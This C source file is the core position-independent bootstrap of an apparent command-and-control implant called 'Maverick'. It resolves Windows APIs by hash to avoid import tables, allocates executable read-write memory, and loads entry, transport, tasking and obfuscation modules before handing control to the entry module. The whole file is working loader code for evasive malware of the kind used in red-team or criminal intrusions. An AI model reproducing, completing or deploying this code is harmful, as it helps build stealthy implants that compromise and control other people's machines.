/*
 * Maverick — Core PIC Bootstrap
 */

#include <windows.h>
#include <stddef.h>
#include "includes/tcg.h"

/* DFR declarations */
WINBASEAPI LPVOID  WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);

/* DFR resolver — musi zwracać char*, tak jak oczekuje Crystal Palace */
char * resolve(DWORD mod_hash, DWORD func_hash) {
    char *hModule = findModuleByHash(mod_hash);
    if (hModule == NULL)
        return NULL;
    return (char *)findFunctionByHash(hModule, func_hash);
}

/* Section markers */
char __ENTRYMODULE__[0]       __attribute__((section("entry_module")));
char __TRANSPORTMODULE__[0]   __attribute__((section("transport_module")));
char __TASKMODULE__[0]        __attribute__((section("task_module")));
char __OBFUSCATIONMODULE__[0] __attribute__((section("obfuscation_module")));

char * findEntryModule()       { return (char *)&__ENTRYMODULE__;       }
char * findTransportModule()   { return (char *)&__TRANSPORTMODULE__;   }
char * findTaskModule()        { return (char *)&__TASKMODULE__;        }
char * findObfuscationModule() { return (char *)&__OBFUSCATIONMODULE__; }

#define WIN32_FUNC( x ) __typeof__( x ) * x

typedef struct {
    WIN32_FUNC(LoadLibraryA);
    WIN32_FUNC(GetProcAddress);
    WIN32_FUNC(VirtualAlloc);
    WIN32_FUNC(VirtualFree);
} WIN32FUNCS;

void go();

void * getStart() {
    return (void *)go;
}

#define MODULE_ALIGN 16

static size_t mv_align_up(size_t v, size_t a) {
    return (v + (a - 1)) & ~(a - 1);
}

char * AllocateAndLoadModule(WIN32FUNCS * funcs, char * srcModule, char * dstCode) {
    SIZE_T dataSize = (SIZE_T)PicoDataSize(srcModule);

    char * dstData = (char *)funcs->VirtualAlloc(
        NULL, dataSize,
        MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
        PAGE_READWRITE);

    if (dstData == NULL)
        return NULL;

    PicoLoad((IMPORTFUNCS *)funcs, srcModule, dstCode, dstData);

    return (char *)PicoEntryPoint(srcModule, dstCode);
}

typedef void (*MV_ENTRY_FUNC)(char * coreBase, char * moduleBase, int moduleSize,
                              char * transportModule, char * taskModule,
                              char * obfuscationModule);

void go() {
    WIN32FUNCS funcs;

    funcs.LoadLibraryA   = (__typeof__(LoadLibraryA) *)   KERNEL32$LoadLibraryA;
    funcs.GetProcAddress = (__typeof__(GetProcAddress) *) KERNEL32$GetProcAddress;
    funcs.VirtualAlloc   = (__typeof__(VirtualAlloc) *)   KERNEL32$VirtualAlloc;
    funcs.VirtualFree    = (__typeof__(VirtualFree) *)    NULL;

    size_t entryModuleSize       = (size_t)PicoCodeSize(findEntryModule());
    size_t transportModuleSize   = (size_t)PicoCodeSize(findTransportModule());
    size_t taskModuleSize        = (size_t)PicoCodeSize(findTaskModule());
    size_t obfuscationModuleSize = (size_t)PicoCodeSize(findObfuscationModule());

    size_t offsetEntry       = 0;
    size_t offsetTransport   = mv_align_up(offsetEntry       + entryModuleSize,       MODULE_ALIGN);
    size_t offsetTask        = mv_align_up(offsetTransport   + transportModuleSize,   MODULE_ALIGN);
    size_t offsetObfuscation = mv_align_up(offsetTask        + taskModuleSize,        MODULE_ALIGN);
    size_t totalSize         = mv_align_up(offsetObfuscation + obfuscationModuleSize, MODULE_ALIGN);

    if (totalSize == 0)
        return;

    char * dstCode = (char *)funcs.VirtualAlloc(
        NULL, totalSize,
        MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
        PAGE_EXECUTE_READWRITE);

    if (dstCode == NULL)
        return;

    char * moduleBase = dstCode;

    char * entryPoint = AllocateAndLoadModule(&funcs, findEntryModule(), dstCode + offsetEntry);
    if (entryPoint == NULL) return;

    char * transportModule = AllocateAndLoadModule(&funcs, findTransportModule(), dstCode + offsetTransport);
    if (transportModule == NULL) return;

    char * taskModule = AllocateAndLoadModule(&funcs, findTaskModule(), dstCode + offsetTask);
    if (taskModule == NULL) return;

    char * obfuscationModule = AllocateAndLoadModule(&funcs, findObfuscationModule(), dstCode + offsetObfuscation);
    if (obfuscationModule == NULL) return;

    ((MV_ENTRY_FUNC)(void *)entryPoint)(
        (char *)getStart(),
        moduleBase,
        (int)totalSize,
        transportModule,
        taskModule,
        obfuscationModule);
}
